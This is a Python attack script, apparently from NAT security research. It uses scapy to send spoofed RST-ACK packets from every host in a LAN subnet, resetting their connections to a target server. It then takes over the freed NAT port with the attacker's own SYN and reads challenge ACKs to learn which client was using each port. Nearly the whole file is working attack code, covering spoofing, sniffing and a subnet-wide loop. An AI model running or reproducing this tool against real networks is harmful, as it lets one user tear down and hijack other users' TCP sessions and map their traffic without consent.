#!/usr/bin/env python3
"""
NAT Client Discovery Tool - Client Identification
=================================================

Description:
    Discovers which internal clients behind a NAT are communicating with a specific
    server on predetermined ports that are being used in the NAT device.
    This tool attempts to take over TCP connections by exploiting NAT port
    preservation strategy and the lack of TCP window tracking.
    (Active ports were identified by the lack of reverse path validation along with the above assumptions)

Attack Technique:
    1. Sends spoofed RST-ACK packets from client IPs to reset potential NAT mapping.
    2. Attempts SYN takeover in the NAT session table using the same source port from attacker's IP  
    3. Server responses to detect successful connection inheritance

Other Assumptions:
    - Target server IP and port are known
    - Guessed Client port range/values are pre-discovered through other methods (see port_infer_main.py)

Usage:
    sudo ./NATed-client-infer.py --subnet-mask 24 --ports-file known_ports.txt
    sudo ./NATed-client-infer.py --subnet-mask 255.255.255.224 --default-ports 50000 60000 44201

Output:
    CSV file mapping client IPs to their used ports and connection status

Author: Suraj Sharma
Date: Nov 2024
Email: suraj.sharma.8062@proton.me
"""

from __future__ import annotations
import argparse, csv, datetime, ipaddress, os, sys, time
from collections import defaultdict
from threading import Thread, Event
from queue import Queue, Empty
import random

# scapy imports
try:
    from scapy.all import AsyncSniffer, send, IP, TCP
except Exception:
    AsyncSniffer = None
    send = None
    IP = None
    TCP = None

# Configuration 
ATTACKER_IP = "" # Attackers' private IP in the LAN
SERVER_IP = "" # Target Server's IP
SERVER_PORT = 22
IFACE = "wlo1"

# Please adjust based on NAT device
WAIT_AFTER_RST = 11.0    # Time for NAT to clear mapping after RST
WAIT_AFTER_SYN = 2.0    # Additional wait after SYN
INTER_PROBE_DELAY = 1.0  # Delay between testing different clients

# TCP sequence
SYN_SEQ = 1000

# Global packet queue and control
pkt_q = Queue()
stop_evt = Event()
sniffer = None

def send_rst(client_ip: str, client_port: int, iface: str = None) -> None:
    """Send crafted RST-ACK from client to server to clear NAT mapping"""
    if IP is None or send is None:
        raise RuntimeError("scapy not available")
    
    pkt = IP(src=client_ip, dst=SERVER_IP) / TCP(
        sport=client_port,
        dport=SERVER_PORT,
        flags="RA",  # RST + ACK
        seq=random.randint(0, 2**32-1),
      #  ack=random.randint(0, 2**32-1) ACK 0 is choosen
    )
    send(pkt, iface=iface or IFACE, verbose=False)
    print(f"  Sent RST-ACK: {client_ip}:{client_port} -> {SERVER_IP}:{SERVER_PORT}")

def send_syn(attacker_port: int, iface: str = None) -> None:
    """Send SYN from attacker to try to take over the port"""
    if IP is None or send is None:
        raise RuntimeError("scapy not available")
    
    pkt = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(
        sport=attacker_port,
        dport=SERVER_PORT,
        flags="S",  # SYN
        seq=SYN_SEQ
    )
    send(pkt, iface=iface or IFACE, verbose=False)
    print(f"  Sent SYN: {ATTACKER_IP}:{attacker_port} -> {SERVER_IP}:{SERVER_PORT} (seq={SYN_SEQ})")

def get_clients(attacker_ip: str, subnet_mask: str) -> list[str]:
    """Calculate all client IPs in subnet excluding attacker"""
    network = ipaddress.IPv4Network(f"{attacker_ip}/{subnet_mask}", strict=False)
    clients = [str(ip) for ip in network.hosts() if str(ip) != attacker_ip]
    return clients

def pkt_callback(pkt):
    """Capture server responses"""
    if not (hasattr(pkt, 'haslayer') and pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return
    
    if pkt[IP].src != SERVER_IP or pkt[IP].dst != ATTACKER_IP:
        return
    if int(pkt[TCP].sport) != SERVER_PORT:
        return
    
    try:
        flags = int(pkt[TCP].flags)
        seq = int(pkt[TCP].seq)
        ack = int(pkt[TCP].ack)
        dport = int(pkt[TCP].dport)
    except Exception:
        return
    
    packet_info = {
        'timestamp': time.time(),
        'flags': flags,
        'seq': seq,
        'ack': ack,
        'dport': dport
    }
    
    pkt_q.put(packet_info)
    print(f"    [CAPTURED] dport={dport}, flags=0x{flags:02x}, ack={ack}")

def start_sniffer():
    if AsyncSniffer is None:
        raise RuntimeError("scapy AsyncSniffer not available")
    
    bpf_filter = f"tcp and src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_IP}"
    sniffer = AsyncSniffer(iface=IFACE, filter=bpf_filter, prn=pkt_callback, store=False)
    sniffer.start()
    return sniffer

def drain_packets():
    """Clear all packets from queue"""
    drained = 0
    while True:
        try:
            pkt_q.get_nowait()
            drained += 1
        except Empty:
            break
    if drained > 0:
        print(f"    Cleared {drained} old packets")

def get_packets_after_time(port: int, start_time: float) -> list:
    packets = []
    while True:
        try:
            pkt = pkt_q.get_nowait()
            if pkt.get('dport') == port and pkt.get('timestamp', 0) > start_time:
                packets.append(pkt)
        except Empty:
            break
    return packets

def analyze_packet(pkt: dict, test_port: int):
    flags = pkt['flags']
    is_syn = bool(flags & 0x02)
    is_ack = bool(flags & 0x10)
    ack_num = pkt.get('ack')
    
    if is_syn and is_ack and ack_num == SYN_SEQ + 1:
        print(f"    [SYN-ACK] New connection on port {test_port}")
    elif is_ack and not is_syn:
        if ack_num != SYN_SEQ + 1:
            print(f"    [Challange ACK] Mapping takeover! ACK={ack_num} (expected {SYN_SEQ + 1})")
   #     else:
           # print(f"    [NORMAL ACK] Normal ACK for our SYN on port {test_port}")

def analyze_packets(packets: list, port: int) -> tuple:
    for pkt in packets:
        if pkt.get('dport') != port:
            continue
            
        flags = pkt['flags']
        is_syn = bool(flags & 0x02)
        is_ack = bool(flags & 0x10)
        ack_num = pkt.get('ack')
        
        if is_syn and is_ack:
            if ack_num == SYN_SEQ + 1:
                return "NEW_CONNECTION", pkt
        elif is_ack and not is_syn:
            if ack_num != SYN_SEQ + 1:
                return "TAKEOVER_SUCCESS", pkt
         #   else:
           #     return "NORMAL_ACK", pkt
                
    return "NO_RESPONSE", None

def test_client(client_ip: str, port: int) -> dict:
    """
    Tests if a specific client was using a specific port
    """
    print(f"Testing {client_ip} on port {port}")
    
    test_start = time.time()
    
    drain_packets()
    
    send_rst(client_ip, port)
    
    print(f"    Monitoring for {WAIT_AFTER_RST}s after RST...")
    time.sleep(WAIT_AFTER_RST)
    
    send_syn(port)
    
    print(f"    Monitoring for {WAIT_AFTER_SYN}s after SYN...")
    time.sleep(WAIT_AFTER_SYN)
    
    packets = get_packets_after_time(port, test_start)
    
    result, pkt_info = analyze_packets(packets, port)
    
    test_result = {
        'client_ip': client_ip,
        'port': port,
        'result': result,
        'timestamp': datetime.datetime.now().isoformat(),
        'packets_captured': len(packets)
    }
    
    if pkt_info:
        test_result.update({
            'server_seq': pkt_info.get('seq'),
            'server_ack': pkt_info.get('ack')
        })
    
    if result == "TAKEOVER_SUCCESS":
        print(f"  [SUCCESS] {client_ip} was using port {port}")
        print(f"    Server ACK: {pkt_info.get('ack')}, Expected: {SYN_SEQ + 1}")
    else:
        print(f"  [FAIL] {result} ({len(packets)} packets)")
    
    return test_result

def load_ports(ports_file: str = None, default_ports: list = None) -> list[int]:
    """Load ports from file or use cli arguments to give ports (default ports)"""
    if ports_file and os.path.exists(ports_file):
        with open(ports_file, 'r') as f:
            ports = [int(line.strip()) for line in f if line.strip()]
     #   print(f"Loaded {len(ports)} ports from {ports_file}")
    else:
        ports = default_ports
        print(f"Using default ports: {ports}")
    
    return ports

def main():
    global WAIT_AFTER_RST, WAIT_AFTER_SYN, INTER_PROBE_DELAY
    
    parser = argparse.ArgumentParser(description="NAT Mapping Discovery Tool: Clinet Identification")
    parser.add_argument("--subnet-mask", required=True, help="Subnet mask (e.g., 255.255.255.0 or 24)")
    parser.add_argument("--ports-file", help="File with ports to test (one per line)")
    parser.add_argument("--output", default="nat-results_01.csv", help="Output CSV file")
    parser.add_argument("--default-ports", nargs="+", type=int, help="Default ports to test space saperated")
    
    # Timing adjustments for different routers
    parser.add_argument("--wait-after-rst", type=float, default=WAIT_AFTER_RST, 
                       help="Wait time after RST (adjust based on routers' mappping clearing time)")
    parser.add_argument("--wait-after-syn", type=float, default=WAIT_AFTER_SYN,
                       help="Wait time after SYN for server response")
    parser.add_argument("--inter-probe-delay", type=float, default=INTER_PROBE_DELAY,
                       help="Delay between testing different clients")
    
    args = parser.parse_args()
    
    WAIT_AFTER_RST = args.wait_after_rst
    WAIT_AFTER_SYN = args.wait_after_syn
    INTER_PROBE_DELAY = args.inter_probe_delay
    
    print("NAT Mapping Discovery Tool: Client Identification")
    print("=" * 50)
    print(f"Attacker: {ATTACKER_IP}")
    print(f"Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"Interface: {IFACE}")
    print(f"Timing - RST wait: {WAIT_AFTER_RST}s, SYN wait: {WAIT_AFTER_SYN}s")
    print(f"Sequence number: {SYN_SEQ}")
    print()
    
    # Calculate client IPs
    clients = get_clients(ATTACKER_IP, args.subnet_mask)
    print(f"Found {len(clients)} client IPs to test")
    
    ports = load_ports(args.ports_file, args.default_ports)
    
    global sniffer
    sniffer = start_sniffer()
    print("Packet sniffer started...")
    time.sleep(1)  
    
    results = []
    
    try:
        for port in ports:
            print(f"\nTesting port {port}:")
            print("-" * 30)
            
            port_found = False
            for client in clients:
                if stop_evt.is_set():
                    break
                    
                result = test_client(client, port)
                results.append(result)
                
                # If we found the client using this port, we can stop testing this port
                if result['result'] == "TAKEOVER_SUCCESS":
                    print(f"[FOUND] Active client: {client} on port {port}")
                    port_found = True
                    break
                
                if not stop_evt.is_set():
                    time.sleep(INTER_PROBE_DELAY)
            
            if port_found:
                print(f"[PORT FOUND] Port {port} mapping identified, moving to next port...")
            else:
                print(f"[NO CLIENT] No active client found for port {port}")
                
    except KeyboardInterrupt:
        print("\nStopping scan...")
        stop_evt.set()
    except Exception as e:
        print(f"\nError: {e}")
        stop_evt.set()
    finally:
        if sniffer:
            sniffer.stop()
        
        if results:
            fieldnames = ['client_ip', 'port', 'result', 'timestamp', 'packets_captured', 
                         'server_seq', 'server_ack']
            
            with open(args.output, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(results)
            
            print(f"\nResults saved to {args.output}")
            
            # Summary
            successes = [r for r in results if r['result'] == 'TAKEOVER_SUCCESS']
            print(f"\nSummary: Found {len(successes)} active client-port mappings")
            for success in successes:
                print(f"  [ACTIVE] {success['client_ip']}:{success['port']}")

if __name__ == "__main__":
    main()
